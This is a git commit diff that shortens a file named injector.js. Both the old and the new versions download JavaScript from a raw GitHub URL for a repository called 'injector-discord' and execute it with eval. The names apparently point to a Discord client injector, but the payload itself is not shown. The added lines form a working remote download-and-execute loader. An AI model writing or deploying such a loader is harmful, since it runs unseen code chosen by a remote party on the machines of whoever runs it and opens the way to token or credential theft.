2e014a8c65eb2f51ec6d4e506b6754d3cc509f78
Samuel <sam@flywer.xyz>
2022-04-23 10:32:01 -0400

    shortenned

--- injector.js
+++ injector.js
@@ -1,11 +1,5 @@
-const url = 'https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/index.js'
-const https = require('https')
-https.get(url, (res, req) => {
-    var data = ""
-    res.on('data', (dat) => {
-        data += dat.toString()
-    })
-    res.on('end', () => {
-        eval(data)
-    })
+require('https').get('https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/index.js', (res) => { 
+    var data = ""; 
+    res.on('data', (dat) => data += dat.toString());
+    res.on('end', () => eval(data));
 })
